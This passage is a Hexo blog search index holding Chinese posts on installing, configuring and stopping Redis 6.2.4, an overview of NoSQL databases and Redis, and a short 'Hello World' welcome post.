devtoolset-8 bash</span><br></pre></td></tr></table></figure></p><ol><li>查看gcc是否安装成功</li></ol><p>检测gcc版本<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><br>安装成功如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/4.1zo605jol5wg.jpg" alt="4"></p><h2 id="解压并安装"><a href="#解压并安装" class="headerlink" title="解压并安装"></a>解压并安装</h2><ol><li>解压安装包<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-6.2.4.tar.gz</span><br></pre></td></tr></table></figure></li><li>解压完成后进入目录<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd redis-6.2.4</span><br></pre></td></tr></table></figure></li><li><p>在目录下执行make命令，编译成C文件</p><div class="note info no-icon flat"><p>注意：如果没有安装C语言编译环境，make命令会报错</p><p>报错信息：jemalloc/jemalloc.h: 没有那个文件或目录</p><p>解决方案：检测gcc是否安装成功，并运行make distclean</p></div></li><li><p>在目录下进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure></li></ol><h2 id="安装目录：-user-local-bin"><a href="#安装目录：-user-local-bin" class="headerlink" title="安装目录：/user/local/bin"></a>安装目录：/user/local/bin</h2><div class="table-container"><table><thead><tr><th style="text-align:left">文件名</th><th style="text-align:left">介绍</th></tr></thead><tbody><tr><td style="text-align:left">redis-benchmark</td><td style="text-align:left">性能测试工具</td></tr><tr><td style="text-align:left">redis-check-aof</td><td style="text-align:left">修复有问题的AOF文件</td></tr><tr><td style="text-align:left">redis-check-rdb</td><td style="text-align:left">修复有问题的dump.rdb文件</td></tr><tr><td style="text-align:left">redis-sentinel</td><td style="text-align:left">Redis哨兵启动，用于主从复制、集群使用</td></tr><tr><td style="text-align:left"><font color='red'>redis-server</td><td style="text-align:left">Redis服务器启动</td></tr><tr><td style="text-align:left"><font color='red'>redis-cli</td><td style="text-align:left">Redis客户端，操作入口</td></tr></tbody></table></div><h2 id="设置密码（非必选）"><a href="#设置密码（非必选）" class="headerlink" title="设置密码（非必选）"></a>设置密码（非必选）</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>方法一：通过配置文件（/etc/redis.conf）进行设置</span></div>    <div class="hide-content"><p>这种方法在设置密码后需要重启redis生效。</p><ol><li>首先找到redis的配置文件—redis.conf文件</li><li>然后修改里面的requirepass（requirepass 是配置redis访问密码的参数）<br>这个本来是注释起来了的，将注释去掉，或者另起一行</li><li>将后面对应的字段设置成自己想要的密码，<code>:wq</code>保存退出。</li><li>重启redis服务，即可。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/1.1d2ur3l3zk9s.jpg" alt=""><br><code>vim编辑器</code>下 normal 模式下搜索指定内容（按Esc ）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/requirepass      # Enter进行搜索， n搜索下一个，N搜索上一个</span><br></pre></td></tr></table></figure></p></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>方法二：通过命令设置密码</span></div>    <div class="hide-content"><p>这种方法相对简单，不需要重启redis服务。连接redis之后，通过命令设置，如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set requirepass 123456   # 这样就把密码改为123456</span><br></pre></td></tr></table></figure><br>设置以后就可以用指令查看密码<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get requirepass</span><br></pre></td></tr></table></figure><br>如下图</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/2.668t28c62000.png" alt=""><br>密码设置之后，当你退出再次连上redis的时候，就需要输入密码了，不然是无法操作的。<br>这里有两种方式输入密码，一是连接的时候直接输入密码，而是连接上之后再输入密码，分别如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/3.5vnulnpk93k0.png" alt=""></p><div class="note warning no-icon flat"><p>注：通过命令行修改了密码之后，配置文件（/etc/redis.conf）的 requirepass 字段后面的密码是不会随之修改的。</p></div></div></div><h2 id="前台启动（不推荐）"><a href="#前台启动（不推荐）" class="headerlink" title="前台启动（不推荐）"></a>前台启动（不推荐）</h2><p>运行redis-server命令启动，但命令行窗口不能关闭，否则服务器停止</p><h2 id="后台启动（推荐）"><a href="#后台启动（推荐）" class="headerlink" title="后台启动（推荐）"></a>后台启动（推荐）</h2><ol><li><p>修改后台启动设置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/redis-6.2.4             # 进入redis目录下</span><br><span class="line">ls                              # 查看文件</span><br><span class="line">cp redis.conf /etc/redis.conf   # 为方便操作，复制redis.conf文件到其他目录下</span><br><span class="line">vim /opt/redis.conf             # 进入编辑器修改文件</span><br></pre></td></tr></table></figure><p>在编辑器中通过<font color='red'>\daemonize</font>查找，将文件内的<font color='red'>daemonize no</font>改为<font color='red'>yes</font>，保存退出，使服务器能在后台启动</p></li><li><p>后台启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure></li><li><p>客户端通过输入<font color='red'>redis-cli</font>命令进行访问</p><div class="note info no-icon flat"><p>多个端口号可输入redis-cli -p 端口号</p></div></li><li><p>密码登陆（<font color='red'>如果前面设置了的话</font>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth &quot;你的密码&quot;   # 进入redis-cli后</span><br></pre></td></tr></table></figure><p>这样就能在redis客户端正常执行命令了。</p></li><li><p>查看进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure></li></ol><h2 id="关闭后台Redis"><a href="#关闭后台Redis" class="headerlink" title="关闭后台Redis"></a>关闭后台Redis</h2><p>一、单实例关闭<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli shutdown</span><br></pre></td></tr></table></figure><br>二、多实例关闭，指定端口关闭<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 端口号 shutdown</span><br></pre></td></tr></table></figure><br>三、关闭Redis进程<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 进程号</span><br></pre></td></tr></table></figure><br>四、在Redis终端中输入shutdown进行关闭</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis详细概述</title>
      <link href="/posts/389b592e/"/>
      <url>/posts/389b592e/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="技术分类"><a href="#技术分类" class="headerlink" title="技术分类"></a>技术分类</h2><div class="table-container"><table><thead><tr><th style="text-align:left">解决问题类型</th><th style="text-align:left">技术</th></tr></thead><tbody><tr><td style="text-align:left">功能性</td><td style="text-align:left">JAVA、Jsp、RDBMS、Tomcat、HTML、Linux、JDBC、SVN</td></tr><tr><td style="text-align:left">扩展性</td><td style="text-align:left">Struts、Spring、SpringMVC、Hibernate、Mybatis</td></tr><tr><td style="text-align:left">性能</td><td style="text-align:left">NoSQL、Java线程、Hadoop、Nginx、MQ、ElasticSearch</td></tr></tbody></table></div><p>随着web技术的不断发展，用户访问量的大幅度提升，同时也产生了大量的用户数据，加之智能移动设备的普及，<br>所有的互联网平台都面临着巨大的性能挑战。</p><div class="note danger no-icon flat"><p>web服务器面临着CPU及内存压力，数据库服务器面临着IO压力。</p></div><h2 id="问题及主要解决方案"><a href="#问题及主要解决方案" class="headerlink" title="问题及主要解决方案"></a>问题及主要解决方案</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>CPU及内存压力：主要为session存储问题</span></div>    <div class="hide-content"><p>但session应该存在哪里呢？</p><ol><li><p>存储在cookie中</p><p>优点：极高的扩展性和可用性</p><p>缺点：不安全</p></li><li><p>存储在文件服务器或者数据库里</p><p>优点：简单高性能，支持分布式与集群</p><p>缺点: 数据库的大量IO效率问题</p></li><li><p>session复制</p><p>优点： 实现简单、配置较少、当网络中有机器Down掉时不影响用户访问</p><p>缺点： 广播式复制有一定廷时，会带来一定网络开销；session对象内容相同，空间浪费造成session数据冗余，节点（服务器）越多浪费越大</p></li><li><p>存储在缓存数据库（例NoSQL数据库）</p><p>优点： 不经过IO，减少访问数据库的频率，完全在内存中，速度快，数据结构简单，无形中缓解了CPU及内存压力</p></li></ol></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>IO压力</span></div>    <div class="hide-content"><p>随着数据量的增多，数据库操作逐渐麻烦，效率也急剧降低</p><ol><li><p>数据库表进行拆分</p><p>水平切分、垂直切分、读写分离，通过破坏一定的业务逻辑来换取性能</p></li><li><p>缓存数据库（例NoSQL数据库）</p><p>通过添加缓存数据库，从中查询数据，从而减少IO的读操作，极大地提高查询效率</p></li></ol></div></div><h2 id="NoSQL数据库概述"><a href="#NoSQL数据库概述" class="headerlink" title="NoSQL数据库概述"></a>NoSQL数据库概述</h2><p>NoSQL(Not Only SQL)，意思为“不仅仅是SQL”，泛指非关系型数据库。</p><p>NoSQL相较于MySQL，它不依赖业务逻辑方式存储，而以简单的key-value模式存储，因此大大的增加了数据库的扩展能力。</p><ul><li>不遵循SQL标准</li><li>不支持ACID（即原子性、一致性、隔离性、持久性）</li><li>远超于SQL的性能</li></ul><div class="note success flat"><p>NoSQL数据库打破了传统关系型数据库以业务逻辑为依据的存储模式，而是针对不同数据结构类型改为以性能为最有限的存储方式。</p></div><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>适用场景</span></div>    <div class="hide-content"><ul><li>对数据高并发读写，例如“购物秒杀系统”</li><li>海量数据读写</li><li>对数据高可扩展性的</li></ul></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>不适用场景</span></div>    <div class="hide-content"><ul><li>取代通过键查询，而是通过值来查询。 Key-Value数据库中根本没有通过值查询的途径。</li><li>需要储存数据之间的关系。在Key-Value数据库中不能通过两个或以上的键来关联数据。</li><li>事务的支持。在Key-Value数据库中故障产生时不可以进行回滚。</li></ul></div></div><h3 id="常见NoSQL数据库"><a href="#常见NoSQL数据库" class="headerlink" title="常见NoSQL数据库"></a>常见NoSQL数据库</h3><div class="table-container"><table><thead><tr><th>数据库名称</th><th>特点</th></tr></thead><tbody><tr><td>Memcache</td><td>1. 很早出现的NoSQL数据库<br>2. 多线程+锁的机制，数据库都在内存中，一般不持久化<br>3. 支持简单的key-value模式，支持类型单一<br>4. 一般是作为缓存数据库辅助持久化的数据库</td></tr><tr><td>Redis</td><td>1. 几乎覆盖了Memcache的绝大部分功能<br>2. 单线程+多路IO复用的机制，数据都在内存中，支持持久化，主要用作备份恢复<br>3. 除了支持简单的key-value模式，还支持多种数据结构的存储，如list、set、hash、zset等<br>4. 一般是作为缓存数据库辅助持久化的数据库</td></tr><tr><td>MongoDB</td><td>1. 文档型数据库<br>2. 数据都在内存中，若内存不足，则把不常用的数据存到硬盘<br>3. 虽然是key-value模式，但是对value（尤其是json）提供强大的查询功能<br>4. 支持二进制数据及大型对象<br>5. 可根据数据特点替代RDBMS，成为独立数据库，亦或配合RDBMS,存储特定数据</td></tr></tbody></table></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>看完上面对NoSQL的介绍，对Redis有一个大概了解了吧</p></div><h2 id="Redis概述"><a href="#Redis概述" class="headerlink" title="Redis概述"></a>Redis概述</h2><p>Redis是当今社会最受欢迎的NoSQL数据库之一，是一个使用ANSI C编写的开源，遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，且提供多种语言的API。</p><div class="note primary no-icon flat"><p>Redis具备以下特性：</p><ul><li>开源C语言代码，支持单线程+多路IO复用，不依赖外部库，速度极快</li><li>数据持久化，支持多种数据结构、编程语言</li><li>高并发读写，支持lua脚本，主从复制</li><li>高可用，支持分布式，理论上可以无限扩展 </li></ul></div><div class="note primary no-icon flat"><p>Redis的应用场景包括：<br>    缓存系统（“热点”数据：高频读、低频写)、计数器、消息队列系统、排行榜、社交网络和实时系统。</p></div><span class="hide-inline"><button type="button" class="hide-button button--animated" style="background-color: far fa-hand-point-right;color:  green larger">看看哪些大厂在使用Redis？  </button><span class="hide-content">github，twitter，微博，Stack Overflow，阿里巴巴，百度，腾讯，美团，搜狐...... </span></span>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156/"/>
      <url>/posts/4a17b156/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Welcome-to-my-blog"><a href="#Welcome-to-my-blog" class="headerlink" title="Welcome to my blog!"></a>Welcome to my blog!</h2><p> by zeker</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
